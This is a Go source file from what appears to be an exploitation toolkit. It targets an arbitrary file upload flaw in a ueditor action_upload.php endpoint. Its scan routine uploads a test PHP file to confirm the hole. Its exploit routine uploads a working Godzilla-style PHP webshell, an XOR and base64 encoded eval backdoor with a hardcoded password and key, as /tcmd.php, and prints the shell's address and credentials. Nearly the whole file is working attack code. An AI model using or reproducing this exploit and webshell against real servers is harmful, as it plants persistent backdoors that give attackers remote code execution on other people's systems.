package vulners

import (
	"strings"

	"github.com/fatih/color"
)

type Td03 struct {
}

func (c *Td03) Scan(targetUrl string) {
	vulnerable, err := Td03scancore(targetUrl)
	if err != nil {
		color.Red("[X]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Td03] 可能存在action_upload.php 任意文件上传，请执行Exp模块进行验证")
	} else {
		color.White("[Td03] 不存在action_upload.php 任意文件上传")
	}
}

func (*Td03) Exploit(targetUrl string) {
	urltest := "/tcmd.php"
	vulnUrl := targetUrl + urltest
	runResult, err := Td03runcore(targetUrl)
	if err != nil {
		color.Red("[X]漏洞利用异常！")
		return
	}
	if runResult {
		color.Green("[Td03] 存在action_upload.php 任意文件上传\n已上传哥斯拉马\n密码pass0123\n密钥key\n加密器PHP_XOR_BASE64\nWebshell地址：%s", vulnUrl)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Td03scancore(targetUrl string) (bool, error) {
	url := "/module/ueditor/php/action_upload.php?action=uploadfile"
	data := `-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ffff
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

tcmd
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="ffff"; filename="test.php"
Content-Type: application/octet-stream

test123
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="mufile"

submit
-----------------------------55719851240137822763221368724--`
	resp, err := baseClient.
		NewRequest().
		SetHeaders(map[string]string{
			"Content-Type":     "multipart/form-data; boundary=---------------------------55719851240137822763221368724",
			"X_requested_with": "XMLHttpRequest"}).SetBodyString(data).Post(targetUrl + url)

	// data := []byte("test123")
	// _, err := baseClient.
	// 	NewRequest().
	// 	SetFileUpload(req.FileUpload{
	// 		ParamName: "file",
	// 		FileName:  "test.php",
	// 		GetFileContent: func() (io.ReadCloser, error) {
	// 			return io.NopCloser(bytes.NewBuffer(data)), nil
	// 		},
	// 		FileSize:    int64(len(data)),
	// 		ContentType: "image/jpeg",
	// 	}).Post(targetUrl + url)

	// _, err := baseClient.
	// 	NewRequest().
	// 	EnableForceMultipart().
	// 	SetFormData(map[string]string, filename{
	// 		"CONFIG[fileFieldName]":    "ffff",
	// 		"CONFIG[fileMaxSize]":      "1000000000",
	// 		"CONFIG[filePathFormat]":   "34667436",
	// 		"CONFIG[fileAllowFiles][]": ".php",
	// 		"ffff":                     "34667436",
	// 		"mufile":                   "submit",
	// 	}).Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	url1 := "/tcmd.php"
	resp1, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url1)
	if err != nil {
		return false, err
	}
	resContent := resp1.String()
	if resp.StatusCode == 200 && strings.Contains(resContent, "test123") {
		return true, nil
	} else {
		return false, nil
	}
}

func Td03runcore(targetUrl string) (bool, error) {
	url := "/module/ueditor/php/action_upload.php?action=uploadfile"
	data := `-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ffff
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

tcmd
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="ffff"; filename="test.php"
Content-Type: application/octet-stream

1368724
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass0123';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}


-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="mufile"

submit
-----------------------------55719851240137822763221368724--`
	resp, err := baseClient.
		NewRequest().
		SetHeaders(map[string]string{
			"Content-Type":     "multipart/form-data; boundary=---------------------------55719851240137822763221368724",
			"X_requested_with": "XMLHttpRequest"}).SetBodyString(data).Post(targetUrl + url)

	if err != nil {
		return false, err
	}
	url1 := "/tcmd.php"
	resp1, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url1)
	if err != nil {
		return false, err
	}
	resContent := resp1.String()
	if resp.StatusCode == 200 && strings.Contains(resContent, "1368724") {
		return true, nil
	} else {
		return false, nil
	}
}
